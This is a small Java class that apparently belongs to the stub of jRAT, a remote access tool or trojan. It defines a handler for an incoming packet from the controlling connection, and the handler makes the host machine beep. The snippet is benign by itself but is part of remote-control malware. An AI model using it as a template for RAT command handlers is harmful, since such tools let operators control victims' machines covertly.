package se.jrat.stub.packets.incoming;

import java.awt.Toolkit;

import se.jrat.stub.Connection;

public class Packet65Beep extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Toolkit.getDefaultToolkit().beep();
	}

}
